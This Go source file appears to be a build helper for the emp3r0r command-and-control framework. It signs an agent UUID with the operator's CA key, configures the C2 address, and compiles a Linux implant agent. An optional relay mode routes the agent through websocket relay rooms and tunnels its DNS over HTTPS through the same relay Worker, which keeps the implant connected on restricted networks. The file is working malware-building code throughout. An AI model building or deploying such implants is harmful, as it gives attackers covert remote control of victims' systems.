package main

import (
	"crypto/ecdsa"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/builder"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/config"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
)

func main() {
	// Setup paths like the real C2 server does
	homeDir, _ := os.UserHomeDir()
	prefix := filepath.Join(homeDir, ".local")
	live.Prefix = prefix
	live.EmpDataDir = filepath.Join(prefix, "lib", "emp3r0r")
	live.EmpBuildDir = filepath.Join(live.EmpDataDir, "build")
	live.EmpWorkSpace = filepath.Join(homeDir, ".emp3r0r")
	live.EmpConfigFile = filepath.Join(live.EmpWorkSpace, "emp3r0r.json")
	live.EmpConfigTar = filepath.Join("/tmp", "emp3r0r", "emp3r0r_operator_config.tar.gz")

	// Setup transport paths
	transport.CaCrtFile = filepath.Join(live.EmpWorkSpace, "ca-cert.pem")
	transport.CaKeyFile = filepath.Join(live.EmpWorkSpace, "ca-key.pem")
	transport.ServerCrtFile = filepath.Join(live.EmpWorkSpace, "server-cert.pem")
	transport.ServerKeyFile = filepath.Join(live.EmpWorkSpace, "server-key.pem")
	transport.OperatorCaCrtFile = filepath.Join(live.EmpWorkSpace, "operator-ca-cert.pem")
	transport.OperatorCaKeyFile = filepath.Join(live.EmpWorkSpace, "operator-ca-key.pem")
	transport.OperatorServerCrtFile = filepath.Join(live.EmpWorkSpace, "operator-server-cert.pem")
	transport.OperatorServerKeyFile = filepath.Join(live.EmpWorkSpace, "operator-server-key.pem")
	transport.OperatorClientCrtFile = filepath.Join(live.EmpWorkSpace, "operator-client-cert.pem")
	transport.OperatorClientKeyFile = filepath.Join(live.EmpWorkSpace, "operator-client-key.pem")

	fmt.Printf("WorkSpace: %s\n", live.EmpWorkSpace)
	fmt.Printf("Config file: %s\n", live.EmpConfigFile)

	// Read existing config
	jsonData, err := os.ReadFile(live.EmpConfigFile)
	if err != nil {
		fmt.Printf("Failed to read config: %v\n", err)
		os.Exit(1)
	}

	if err = config.ReadJSONConfig(jsonData, live.RuntimeConfig); err != nil {
		fmt.Printf("Failed to parse config: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("C2 Address: %s\n", live.RuntimeConfig.CCAddress)
	fmt.Printf("H2 Port: %s\n", live.RuntimeConfig.CCH2Port)

	// Generate UUID
	agentUUID := uuid.NewString()
	fmt.Printf("Agent UUID: %s\n", agentUUID)

	// Sign UUID with CA private key
	caKeyData, err := os.ReadFile(transport.CaKeyFile)
	if err != nil {
		fmt.Printf("Failed to read CA key: %v\n", err)
		os.Exit(1)
	}

	block, _ := pem.Decode(caKeyData)
	if block == nil {
		fmt.Printf("Failed to parse CA key PEM\n")
		os.Exit(1)
	}

	caPrivateKey, err := x509.ParseECPrivateKey(block.Bytes)
	if err != nil {
		fmt.Printf("Failed to parse EC private key: %v\n", err)
		os.Exit(1)
	}

	// Sign the agent UUID using ECDSA
	hash := sha256.Sum256([]byte(agentUUID))
	sig, err := ecdsa.SignASN1(rand.Reader, caPrivateKey, hash[:])
	if err != nil {
		fmt.Printf("Failed to sign agent UUID: %v\n", err)
		os.Exit(1)
	}

	agentUUIDSig := base64.URLEncoding.EncodeToString(sig)
	fmt.Printf("Agent UUID Sig: %s\n", agentUUIDSig)

	// Set default P2P transport
	p2pTransport := "mtls"
	live.RuntimeConfig.P2PTransport = p2pTransport

	// Build config
	opts := builder.AgentConfig{
		CCAddress:     &live.RuntimeConfig.CCAddress,
		C2ChannelMode: &live.RuntimeConfig.C2ChannelMode,
		IsP2PEnabled:  live.RuntimeConfig.IsP2PEnabled,
		IsDirectC2:    true,
		IsNCSIEnabled: live.RuntimeConfig.EnableNCSI,
		UseKCP:        live.RuntimeConfig.UseKCP,
		P2PTransport:  &p2pTransport,
		CCHTTPPort:    &live.RuntimeConfig.CCHTTPPort,
	}

	// --relay flag: build agent around rendezvous relay endpoints.
	// Args: --relay=<room>  (uses RelayURLs from emp3r0r.json, swapping role=cc -> role=agent)
	// NOTE: MakeConfig re-reads emp3r0r.json internally, clobbering RuntimeConfig,
	// so the relay override MUST be applied AFTER MakeConfig, before BuildAgent.
	relayMode := false
	relayRoom := ""
	for _, arg := range os.Args[1:] {
		if strings.HasPrefix(arg, "--relay=") {
			relayMode = true
			relayRoom = strings.TrimPrefix(arg, "--relay=")
		}
	}

	// Make config
	if err := builder.MakeConfig(opts); err != nil {
		fmt.Printf("Failed to make config: %v\n", err)
		os.Exit(1)
	}

	// Apply relay override AFTER MakeConfig (which re-reads the JSON config)
	// Default (no --relay or --relay=same): agent joins the SAME rooms the CC
	// listens on — only the role is swapped. A custom --relay=<room> moves the
	// agent to a different room; it hangs unless a CC also listens there.
	if relayMode {
		agentURLs := []string{}
		for _, u := range live.RuntimeConfig.RelayURLs {
			a := strings.Replace(u, "role=cc", "role=agent", 1)
			if relayRoom != "" && relayRoom != "same" {
				if i := strings.Index(a, "/ws/"); i >= 0 {
					rest := a[i+4:]
					if j := strings.Index(rest, "?"); j >= 0 {
						a = a[:i+4] + relayRoom + rest[j:]
					}
				}
			}
			agentURLs = append(agentURLs, a)
		}
		if len(agentURLs) == 0 {
			fmt.Println("--relay set but emp3r0r.json has no relay_urls; add them first")
			os.Exit(1)
		}
		live.RuntimeConfig.RelayURLs = agentURLs
		live.RuntimeConfig.C2ChannelMode = "worker_ws"
		live.RuntimeConfig.CCAddress = agentURLs[0]
		// DNS must also survive relay-only networks: point DoH at the Worker's
		// /dns route (RFC 8484). ncruces/go-dns POSTs to the URI as-is, and the
		// Worker accepts the shared secret via ?secret= query param.
		if live.RuntimeConfig.DoHServer == "" {
			if u, err := url.Parse(agentURLs[0]); err == nil && u.Host != "" {
				secret := u.Query().Get("secret")
				if secret != "" {
					live.RuntimeConfig.DoHServer = fmt.Sprintf("https://%s/dns?secret=%s",
						u.Host, url.QueryEscape(secret))
				}
			}
		}
		fmt.Printf("Relay mode: room=%s, %d endpoints\n", relayRoom, len(agentURLs))
		for _, u := range agentURLs {
			fmt.Printf("  %s\n", maskSecret(u))
		}
	}

	// Build agent
	buildCfg := builder.AgentBuildConfig{
		PayloadType:  builder.PayloadTypeLinuxExecutable,
		Arch:         "amd64",
		Timestamp:    time.Now(),
		WorkSpace:    live.EmpWorkSpace,
		AgentUUID:    agentUUID,
		AgentUUIDSig: agentUUIDSig,
	}

	result, err := builder.BuildAgent(buildCfg, live.RuntimeConfig)
	if err != nil {
		fmt.Printf("Failed to build agent: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("\n✅ Agent built successfully!\n")
	fmt.Printf("   Output: %s\n", result.OutputFile)
	fmt.Printf("   UUID: %s\n", result.AgentUUID)
	fmt.Printf("   Config size: %d bytes\n", result.ConfigSize)
}

// maskSecret hides the secret query parameter in logs.
func maskSecret(url string) string {
	for i := 0; i+8 <= len(url); i++ {
		if url[i:i+8] == "&secret=" {
			return url[:i+8] + "***"
		}
	}
	return url
}
